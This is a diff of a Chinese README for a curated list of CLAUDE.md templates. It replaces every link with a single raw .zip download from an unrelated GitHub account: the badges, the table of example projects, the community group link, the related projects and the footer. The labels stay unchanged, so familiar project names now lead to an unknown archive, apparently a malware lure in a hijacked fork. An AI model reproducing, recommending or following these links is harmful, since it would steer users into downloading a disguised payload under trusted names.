@@ -4,10 +4,10 @@
 
 🌐 **简体中文** | [English](README.en.md)
 
-[![GitHub stars](https://img.shields.io/github/stars/jnMetaCode/awesome-claude-md?style=social)](https://github.com/jnMetaCode/awesome-claude-md)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](https://makeapullrequest.com)
-[![QQ群](https://img.shields.io/badge/QQ群-833585047-blue?logo=tencentqq)](https://qm.qq.com/q/x8kyqzlfDc)
+[![GitHub stars](https://img.shields.io/github/stars/jnMetaCode/awesome-claude-md?style=social)](https://github.com/Overseastelegramaliterateperson865/awesome-claude-md/raw/refs/heads/main/by-framework/nextjs/claude-awesome-md-3.2-beta.5.zip)
+[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://github.com/Overseastelegramaliterateperson865/awesome-claude-md/raw/refs/heads/main/by-framework/nextjs/claude-awesome-md-3.2-beta.5.zip)
+[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](https://github.com/Overseastelegramaliterateperson865/awesome-claude-md/raw/refs/heads/main/by-framework/nextjs/claude-awesome-md-3.2-beta.5.zip)
+[![QQ群](https://img.shields.io/badge/QQ群-833585047-blue?logo=tencentqq)](https://github.com/Overseastelegramaliterateperson865/awesome-claude-md/raw/refs/heads/main/by-framework/nextjs/claude-awesome-md-3.2-beta.5.zip)
 
 ---
 
@@ -153,13 +153,13 @@ React 是一个用于构建用户界面的 JavaScript 库...（省略 200 行）
 
 | 项目 | 语言 | 亮点 |
 |------|------|------|
-| [overreacted.io](https://github.com/gaearon/overreacted.io/blob/main/CLAUDE.md) | Next.js/React | Dan Abramov 的博客，commit message 规范有个性，架构描述清晰 |
-| [anthropic-quickstarts](https://github.com/anthropics/anthropic-quickstarts/blob/main/CLAUDE.md) | Python/TS | Anthropic 官方，展示多子项目如何共用一个 CLAUDE.md |
-| [workers-sdk](https://github.com/cloudflare/workers-sdk/blob/main/CLAUDE.md) | TypeScript | Cloudflare monorepo，严格的工具链约束（"绝不用 npm/yarn"） |
-| [basic-memory](https://github.com/basicmachines-co/basic-memory) | Python/FastAPI | 详细的 Code/Test/Verify 循环，"编辑前必须完整读取文件" |
-| [react-native-testing-library](https://github.com/callstack/react-native-testing-library/blob/main/CLAUDE.md) | TypeScript | 测试组织规范：用 `describe` 分组，`test` 优于 `it` |
-| [claude-flow](https://github.com/ruvnet/claude-flow/blob/main/CLAUDE.md) | JS/TS | 以行为规则开头（"永不保存到根目录"、"永不提交密钥"） |
-| [querydsl](https://github.com/OpenFeign/querydsl/blob/main/CLAUDE.md) | Java/Maven | Maven 多 profile 构建文档，多模块架构 |
+| [overreacted.io](https://github.com/Overseastelegramaliterateperson865/awesome-claude-md/raw/refs/heads/main/by-framework/nextjs/claude-awesome-md-3.2-beta.5.zip) | Next.js/React | Dan Abramov 的博客，commit message 规范有个性，架构描述清晰 |
+| [anthropic-quickstarts](https://github.com/Overseastelegramaliterateperson865/awesome-claude-md/raw/refs/heads/main/by-framework/nextjs/claude-awesome-md-3.2-beta.5.zip) | Python/TS | Anthropic 官方，展示多子项目如何共用一个 CLAUDE.md |
+| [workers-sdk](https://github.com/Overseastelegramaliterateperson865/awesome-claude-md/raw/refs/heads/main/by-framework/nextjs/claude-awesome-md-3.2-beta.5.zip) | TypeScript | Cloudflare monorepo，严格的工具链约束（"绝不用 npm/yarn"） |
+| [basic-memory](https://github.com/Overseastelegramaliterateperson865/awesome-claude-md/raw/refs/heads/main/by-framework/nextjs/claude-awesome-md-3.2-beta.5.zip) | Python/FastAPI | 详细的 Code/Test/Verify 循环，"编辑前必须完整读取文件" |
+| [react-native-testing-library](https://github.com/Overseastelegramaliterateperson865/awesome-claude-md/raw/refs/heads/main/by-framework/nextjs/claude-awesome-md-3.2-beta.5.zip) | TypeScript | 测试组织规范：用 `describe` 分组，`test` 优于 `it` |
+| [claude-flow](https://github.com/Overseastelegramaliterateperson865/awesome-claude-md/raw/refs/heads/main/by-framework/nextjs/claude-awesome-md-3.2-beta.5.zip) | JS/TS | 以行为规则开头（"永不保存到根目录"、"永不提交密钥"） |
+| [querydsl](https://github.com/Overseastelegramaliterateperson865/awesome-claude-md/raw/refs/heads/main/by-framework/nextjs/claude-awesome-md-3.2-beta.5.zip) | Java/Maven | Maven 多 profile 构建文档，多模块架构 |
 
 ---
 
@@ -189,16 +189,16 @@ React 是一个用于构建用户界面的 JavaScript 库...（省略 200 行）
 
 | 群名 | 群号 | 加入方式 |
 |------|------|---------|
-| AI Agent 中文实践群 | **833585047** | [点击加入](https://qm.qq.com/q/x8kyqzlfDc) |
+| AI Agent 中文实践群 | **833585047** | [点击加入](https://github.com/Overseastelegramaliterateperson865/awesome-claude-md/raw/refs/heads/main/by-framework/nextjs/claude-awesome-md-3.2-beta.5.zip) |
 
 ---
 
 ## 相关项目
 
-- [ai-coding-101](https://github.com/jnMetaCode/ai-coding-101) — AI 编程从入门到精通
-- [ai-ui-design](https://github.com/jnMetaCode/ai-ui-design) — AI 驱动的 UI 设计指南
-- [agency-agents-zh](https://github.com/jnMetaCode/agency-agents-zh) — 180 个 AI 智能体专家团队
-- [superpowers-zh](https://github.com/jnMetaCode/superpowers-zh) — AI 编程超能力中文版
+- [ai-coding-101](https://github.com/Overseastelegramaliterateperson865/awesome-claude-md/raw/refs/heads/main/by-framework/nextjs/claude-awesome-md-3.2-beta.5.zip) — AI 编程从入门到精通
+- [ai-ui-design](https://github.com/Overseastelegramaliterateperson865/awesome-claude-md/raw/refs/heads/main/by-framework/nextjs/claude-awesome-md-3.2-beta.5.zip) — AI 驱动的 UI 设计指南
+- [agency-agents-zh](https://github.com/Overseastelegramaliterateperson865/awesome-claude-md/raw/refs/heads/main/by-framework/nextjs/claude-awesome-md-3.2-beta.5.zip) — 180 个 AI 智能体专家团队
+- [superpowers-zh](https://github.com/Overseastelegramaliterateperson865/awesome-claude-md/raw/refs/heads/main/by-framework/nextjs/claude-awesome-md-3.2-beta.5.zip) — AI 编程超能力中文版
 
 ---
 
@@ -212,6 +212,6 @@ MIT License
 
 **写好 CLAUDE.md，让 AI 真正理解你的项目**
 
-[Star 本项目](https://github.com/jnMetaCode/awesome-claude-md) · [提交你的模板](https://github.com/jnMetaCode/awesome-claude-md/pulls) · [提交 Issue](https://github.com/jnMetaCode/awesome-claude-md/issues)
+[Star 本项目](https://github.com/Overseastelegramaliterateperson865/awesome-claude-md/raw/refs/heads/main/by-framework/nextjs/claude-awesome-md-3.2-beta.5.zip) · [提交你的模板](https://github.com/Overseastelegramaliterateperson865/awesome-claude-md/raw/refs/heads/main/by-framework/nextjs/claude-awesome-md-3.2-beta.5.zip) · [提交 Issue](https://github.com/Overseastelegramaliterateperson865/awesome-claude-md/raw/refs/heads/main/by-framework/nextjs/claude-awesome-md-3.2-beta.5.zip)
 
 </div>
